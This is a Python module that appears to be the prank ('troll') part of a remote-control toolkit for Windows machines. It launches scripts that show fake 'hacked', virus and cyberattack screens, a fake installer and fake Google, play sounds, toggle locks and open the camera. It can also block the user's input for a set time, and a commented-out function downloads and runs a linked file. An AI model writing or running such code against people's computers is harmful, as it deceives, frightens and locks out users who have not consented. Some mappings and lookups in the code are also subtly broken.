import ctypes
from ..scripting_interface import *
from ..input_output import block_input
from ...scripts.vb_scripts.troll import showMessage
from ...scripts.batch_scripts import troll as bt
from ...scripts.vb_scripts import troll as vt
from ...scripts.powershell_scripts import troll as pt



def show_message_box(title, message, VBS = True):
    """ Shows a message box; Use VBS = True so that killing the from task manager doesn't kill the python interpreter"""
    if not VBS:
        ctypes.windll.user32.MessageBoxA(0, message, title)
    else:
        execute_vb_script(showMessage.format(message, title))

def run_troll_script(scriptName:str, blocktime = 0, *formatText):
    """Available Scripts: hacked, eainstaller, speakMessage, virusBox, writeMessage, showMessage, showNotification
       fakeGoogle, virusAttack, sphereAnimation, cyberAttack, bouncingBall, lockedFile, error, matrix, tree
       Note : speakMessage, writeMessage, showNotification, toogleLocks needs to be formatted with some text."""
    blocktime = int(blocktime)
    batchScripts = {
        "fakegoogle": bt.fakeGoogle, 
        "virusattack": bt.virusAttack, 
        "sphereanimation": bt.sphereAnimation, 
        "cyberattack": bt.cyberAttack, 
        "bouncingball": bt.lockedFile, 
        "error": bt.error, 
        "matrix": bt.matrix, 
        "tree" : bt.tree
    }
    VBScripts = {
        "hacked" : vt.hacked, 
        "eainstaller" : vt.eaInstaller, 
        "speakmessage" : vt.speakMessage, 
        "virusbox" : vt.virusBox, 
        "writemessage" : vt.writeMessage, 
        "showmessage" : vt.showMessage, 
        "tooglelocks": vt.toogleLocks
    }
    powershellScripts = {
        "shownotification" : pt.showNotification,
        "playwindowssoundcontinously" : pt.playWindowsSoundContinously
    }
    if scriptName.lower() in batchScripts:
        execute_batch_script(batchScripts[scriptName].format(*formatText))
    elif scriptName.lower() in VBScripts:
        execute_vb_script(VBScripts[scriptName].format(*formatText))
    elif scriptName.lower() in powershellScripts:
        execute_powershell_script(powershellScripts[scriptName].format(*formatText))
    if blocktime > 0:
        b = block_input.BlockInput
        b.block_smart_seconds(blocktime)


def open_camera_app():
    p = subprocess.Popen([CMD_PATH, "/c", "start", "Microsoft.windows.camera:"] , subprocess.CREATE_NEW_CONSOLE)

#def change_wallpaper_http(link_to_themepack:str):
 #   if ".themepack" not in link_to_themepack:
  #      return 0
   # try:
    #    _ , name = Download.download_file_http(link_to_themepack, saveTo = TEMP)
     #   subprocess.Popen(os.path.join(TEMP, name), creationflags = subprocess.CREATE_NEW_CONSOLE)
      #  return 1
    #except:
     #   return 0


